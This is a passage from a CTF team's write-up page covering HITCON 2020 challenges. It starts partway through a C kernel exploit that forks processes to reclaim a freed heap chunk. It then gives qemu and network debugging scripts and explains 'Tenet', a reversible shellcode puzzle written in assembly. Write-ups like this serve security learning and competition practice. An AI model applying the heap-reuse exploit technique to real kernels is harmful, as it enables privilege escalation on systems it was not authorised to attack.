</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=nf>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>//Spawn several child to get the free chunk allocated
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=kt>char</span> <span class=o>*</span> <span class=n>newarg</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=s>&#34;child&#34;</span><span class=p>,</span> <span class=nb>NULL</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>      <span class=nf>execv</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>newarg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;neve executed!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//checks that the chunk is been written with something else
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nf>get_token</span><span class=p>(</span><span class=n>fd</span><span class=p>)</span> <span class=o>!=</span> <span class=n>TOKEN</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;daje!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=c1>//Try to run stuff to get a crash!
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nf>print_info</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>alloca_size</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>mappa</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;before close&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;[parent] Message left.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>parent_work</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>child_work</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 class="relative group">The Setup<div id=the-setup class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-setup aria-label=Anchor>#</a></span></h3><p>I believe a nice setup is one of the most important and useful things to solve a
CTF challenge. I was a little rusty (a better word for noob) with qemu machines.
I am putting the setup scripts in this section so that the future me, which will
still be rusty with qemu machines, can quickly readapt those scripts during
another CTF. Credits for compilation setup go to mebeim.</p><h4 class="relative group">Run machine recompiling my sourcecode<div id=run-machine-recompiling-my-sourcecode class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#run-machine-recompiling-my-sourcecode aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1># Uncompress, make changes, recompress</span>
</span></span><span class=line><span class=cl><span class=c1># mkdir initramfs</span>
</span></span><span class=line><span class=cl><span class=c1># cd initramfs</span>
</span></span><span class=line><span class=cl><span class=c1># zcat ../initramfs.cpio.gz | cpio -i -d</span>
</span></span><span class=line><span class=cl><span class=c1># ... edit stuff</span>
</span></span><span class=line><span class=cl><span class=c1># find . | cpio -o -H newc | gzip -9 &gt; ../initramfs_edited.cpio.gz</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>set</span> -e
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>gcc  -static -g <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -o initramfs/home/atoms/expl expl.c
</span></span><span class=line><span class=cl>cp expl.c initramfs/home/atoms/expl.c
</span></span><span class=line><span class=cl><span class=nb>cd</span> initramfs
</span></span><span class=line><span class=cl>find . <span class=p>|</span> cpio -o -H newc <span class=p>|</span> gzip -9 &gt; ../initramfs_edited.cpio.gz
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>qemu-system-x86_64 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -s <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -kernel ./bzImage <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -initrd ./initramfs_edited.cpio.gz <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -nographic <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -cpu qemu64 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -append <span class=s2>&#34;console=ttyS0 nokaslr panic=-1 softlockup_panic=1&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -no-reboot <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -m 256M -smp <span class=nv>cores</span><span class=o>=</span><span class=m>2</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -device e1000,netdev<span class=o>=</span>network0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -netdev tap,id<span class=o>=</span>network0,ifname<span class=o>=</span>tap0,script<span class=o>=</span>no,downscript<span class=o>=</span>no <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -monitor none
</span></span></code></pre></div><p><code>-s</code> is for enableing gdbserver on the kernel.</p><pre tabindex=0><code>-device e1000,netdev=network0 \
-netdev tap,id=network0,ifname=tap0,script=no,downscript=no \
</code></pre><p>To enable network communication between gest and host. You also need the network
setup script and assign an IP in the machine. I achieved the IP assignment by
modifying the init script of the initramfs. <code>nokaslr</code> as kernel option to
disable kaslr. <code>cat /proc/kallsyms</code> from inside the vm to get position of
functions inside the kernel.</p><h4 class="relative group">Setup network for debugging<div id=setup-network-for-debugging class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#setup-network-for-debugging aria-label=Anchor>#</a></span></h4><p>I needed the network setup from the host and the guest in order to run a
gdbserver on the executable inside the vm.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>sudo ip link add br0 <span class=nb>type</span> bridge
</span></span><span class=line><span class=cl>sudo ip addr flush dev br0
</span></span><span class=line><span class=cl><span class=c1># Assign IP to the bridge.</span>
</span></span><span class=line><span class=cl>sudo ip addr add 192.168.100.50/24 brd 192.168.100.255 dev br0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#reate TAP interface.</span>
</span></span><span class=line><span class=cl>sudo ip tuntap add mode tap user <span class=k>$(</span>whoami<span class=k>)</span>
</span></span><span class=line><span class=cl>ip tuntap show
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Add TAP interface to the bridge.</span>
</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> tap0 master br0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Make sure everything is up</span>
</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> dev br0 up
</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> dev tap0 up
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># DELETE</span>
</span></span><span class=line><span class=cl><span class=c1># sudo ip link set dev br0 down</span>
</span></span><span class=line><span class=cl><span class=c1># sudo ip link set dev tap0 down</span>
</span></span><span class=line><span class=cl><span class=c1># sudo ip link del br0</span>
</span></span><span class=line><span class=cl><span class=c1># sudo ip link del tap0</span>
</span></span></code></pre></div><p>Inside <code>./initramfs/init</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ifconfig eth0 up
</span></span><span class=line><span class=cl>ip addr add 192.168.100.51/24 broadcast 192.168.100.255 dev eth0
</span></span></code></pre></div><h2 class="relative group">Tenet<div id=tenet class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#tenet aria-label=Anchor>#</a></span></h2><blockquote><p>You have to start looking at the world in a new way.</p><p>nc 52.192.42.215 9427</p><p>Author: david942j</p></blockquote><h3 class="relative group">The Goal of the Challenge<div id=the-goal-of-the-challenge-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-goal-of-the-challenge-1 aria-label=Anchor>#</a></span></h3><p>The challenge is based on the <code>server.rb</code> ruby script which takes a shellcode as
input and wraps it into an ELF executable file that is then run by the
<code>time_machine</code> debugger. The goal of the challenge was to initially reverse this
debugger and learn what it exactly does. Later on we found out that in order to
retrieve the flag the shellcode needed to be executable in two ways: the normal
and the reversed one. The peculiarity was that the code would run reversed
following the same flow it got in the &lsquo;straight&rsquo; way.</p><h3 class="relative group">The generated ELF<div id=the-generated-elf class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-generated-elf aria-label=Anchor>#</a></span></h3><p>First of all we wanted to test out what kind of wrapping was in place within our
shellcode, we found out that seccomp was enabled preventing us from executing
every possible syscall but read, write, exit, and sigreturn, as mentioned in the
man:</p><blockquote><p>The only system calls that the calling thread is permitted to make are
read(2), write(2), _exit(2) (but not exit_group(2)), and sigreturn(2)</p></blockquote><p>We also found that it initialized a both readable and writable mapping at
address <code>0x2170000</code> to <code>0x2171000</code>. Our shellcode started from address
<code>0xdead0080</code> and needed to be less than 2KB.</p><h3 class="relative group">The time_machine debugger<div id=the-time_machine-debugger class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-time_machine-debugger aria-label=Anchor>#</a></span></h3><p>We started reversing this binary, we soon realized that it was a debugger
executing whatever it&rsquo;s passed through as a first argument (Our generated ELF).
Our shellcode was executed step by step saving in a list every executed
instruction address. Once it got to a SYSCALL instruction it checked whether the
EAX register was set to 0x3C (sys_exit) and, if so, it started executing every
instruction stored in the list in reversed order. The syscall (or sysenter)
instructions were completely ignored and even if we got one we couldn&rsquo;t execute
almost anything because of the seccomp. The debugger, once started, also sets an
8byte cookie to <code>0x2170000</code>, checks if it&rsquo;s cleared once our shellcode is
executed and rechecks if it&rsquo;s there once it got executed the other way back.</p><h3 class="relative group">The shellcode<div id=the-shellcode class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-shellcode aria-label=Anchor>#</a></span></h3><p>So the challenge was: write down an assembly that could erase the cookie when
executed in the normal way and could restore it when executed with the same flow
but reversed. Our first tought was to store it into a register and xor it to
memory in a way that looked like this:</p><pre tabindex=0><code>mov rcx, 0x2170000
mov rdx, 0x0     ; Clean rdx
xor rdx, [rcx]   ; Set/erase rdx
xor [rcx], rdx   ; Erase/set memory
mov rcx, 0x2170000
mov eax, 0x3c
syscall
</code></pre><p>Of course, it wasn&rsquo;t that simple, the registers (both the CPU and FP ones) got
erased right before the reversed execution, we needed somewhere else to store
the cookie. The stack? No, we couldn&rsquo;t have a stack address in the reversed
execution. The rest of the <code>0x2170000</code> mapping? No, this debugger checked
also that the entire page was NULL(ed). But then we realized that we actually
had a memory: the executed instruction order! So the final shellcode looked like
this:</p><pre tabindex=0><code>mov rdx, 0x2170000 ; initialize rdx to cookie address
mov rsp, 0x2170500 ; improvised stack to store ret values

mov rcx, rdx
add rcx, 0
call confrontoLow ; confronto == compare
add rcx, 0
mov rcx, rdx
add rcx, 0
call confrontoHigh
add rcx, 0

mov rcx, rdx

add rcx, 1
call confrontoLow
add rcx, 1
mov rcx, rdx
add rcx, 1
call confrontoHigh
add rcx, 1

mov rcx, rdx
    .
    . ; Replicated code for every nibble possible value
    .
add rcx, 15 ; While coding at 4am, we didn&#39;t realized that up to 7 was enough, we copied more than needed(16 bytes)
call confrontoLow
add rcx, 15
mov rcx, rdx
add rcx, 15
call confrontoHigh
add rcx, 15


push 0 ; clean improvised stack
; reset a bunch of things just to be sure
mov rsp, 0x2170500
mov rdx, 0x2170000
mov rcx, 0x2170500
xor rdx,rdx
xor rbx,rbx
xor rcx,rcx
xor r14,r14
; Or should I comment here? Whatever...
mov rax, 0x3c
syscall


; Check the upper nibble and jump to the calculated function offset
confrontoHigh:
xor rbx,rbx
mov bl, byte ptr[rcx]
shr bl, 4
mov r14, 0xdead035b ; absolute for nibble00High
add r14, rbx        ; multiply by 8 for lazy people
add r14, rbx
add r14, rbx
add r14, rbx
add r14, rbx
add r14, rbx
add r14, rbx
add r14, rbx
jmp r14


; Check the lower nibble and jump to the calculated function offset
confrontoLow:
xor rbx,rbx
mov bl, byte ptr[rcx]
and bl, 0xf
mov r14, 0xdead030b ; absolute for nibble00Low
add r14, rbx        ; multiply by 5 for lazy people
add r14, rbx
add r14, rbx
add r14, rbx
add r14, rbx
jmp r14


nibble00Low:
xor qword ptr [rcx],0x00
ret

nibble01:
xor qword ptr [rcx],0x01
ret
    .
    .
    .
nibble0f:
xor qword ptr [rcx],0x0f
ret


nibble00High:
xor qword ptr [rcx],0x00
ret
nop  ; Needed a 3 byte offset because xor with immediate â‰¤0x7f is smaller than the other half byte (Wtf x64 assembly?)
nop
nop

nibble10:
xor qword ptr [rcx],0x10
ret
nop
nop
nop
    .
    .
    .
nibble70:
xor qword ptr [rcx],0x70
ret
nop
nop
nop

nibble80:
xor qword ptr [rcx],0x80
ret
    .
    .
    .
nibblef0:
xor qword ptr [rcx],0xf0
ret
</code></pre><p>And the flow does the rest&mldr; When it goes back it initializes a register at the
right byte address and the flow &lsquo;remembers&rsquo; which value every nibble had by
executing the code segment containing the xor with that value.</p><h3 class="relative group">Conclusion<div id=conclusion class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#conclusion aria-label=Anchor>#</a></span></h3><p>We could, as we had seen from the solution, have used bits instead of nibbles
but hey! At least we didn&rsquo;t use bytes! Also, during our journey, we thought we
could use some floating-point register but we had seen that this wasn&rsquo;t the case
because those got erased too. (Turns out we were wrong because the xmm registers
did got erased, while the ymm registers didn&rsquo;t get erased)</p></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/2020-12-05-hitcon2020-all-writeups/index.md data-oid-likes=likes_writeups/2020-12-05-hitcon2020-all-writeups/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/writeups/2019-01-28-codegate-quals-2019-20000/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">20000 - Codegate Quals 2019</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2019-01-28T00:00:00+00:00>28 January 2019</time>
</span></span></a></span><span><a class="flex text-right group ml-3" href=/writeups/2023-07-01-hackasat4-quals-writeups/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Hack-A-Sat 4 Quals - Write ups</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2023-07-01T00:00:00+00:00>1 July 2023</time>
</span></span><span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href title></a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
mhackeroni</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://mhackeroni.it/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>